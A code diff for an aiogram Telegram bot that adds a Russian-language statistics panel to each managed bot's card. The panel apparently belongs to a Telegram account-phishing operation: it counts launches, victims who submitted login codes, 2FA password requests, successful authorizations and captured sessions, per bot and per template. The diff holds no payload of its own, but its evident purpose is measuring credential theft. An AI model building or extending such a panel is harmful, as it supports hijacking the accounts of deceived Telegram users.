@@ -3,7 +3,14 @@ from __future__ import annotations
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
-from database import direct_link_enabled, get_template
+from database import (
+    direct_link_enabled,
+    get_auth_event_counts,
+    get_bot_sessions_count,
+    get_launch_stats,
+    get_miniapp_launch_count,
+    get_template,
+)
 from templates import template_name
 
 def _bot_template_name(bot: dict) -> str:
@@ -13,6 +20,24 @@ def _bot_template_name(bot: dict) -> str:
         if t:
             return t["name"]
     return template_name(bot.get("template"))
+
+def _bot_stats_lines(tg_id) -> list[str]:
+    if not tg_id:
+        return []
+    stats = get_launch_stats(tg_id)
+    miniapp_total = get_miniapp_launch_count(tg_id)
+    auth = get_auth_event_counts(tg_id)
+    sessions_total = get_bot_sessions_count(tg_id)
+    return [
+        "📊 <b>Статистика</b>",
+        f"Запусков: <b>{stats['total']}</b>",
+        f"Запусков мини-апп: <b>{miniapp_total}</b>",
+        f"Отправили код: <b>{auth['code_sent']}</b>",
+        f"Запросили 2фа: <b>{auth['pwd_requested']}</b>",
+        f"Авторизаций: <b>{auth['success']}</b>",
+        f"Сессии: <b>{sessions_total}</b>",
+        f"Уникальных юзеров: <b>{stats['unique']}</b>",
+    ]
 
 def render_bot_card(bot: dict) -> tuple[str, InlineKeyboardMarkup]:
     username = bot["username"] or "—"
@@ -31,6 +56,11 @@ def render_bot_card(bot: dict) -> tuple[str, InlineKeyboardMarkup]:
         lines.append(f"🔥 Ссылка для юзера: {link}")
         lines.append("")
     lines.append(f"💎 Мини-апп: {'Включено' if miniapp else 'Выключено'}")
+
+    stats_lines = _bot_stats_lines(bot.get("tg_id"))
+    if stats_lines:
+        lines.append("")
+        lines.extend(stats_lines)
 
     text = "\n".join(lines)
 
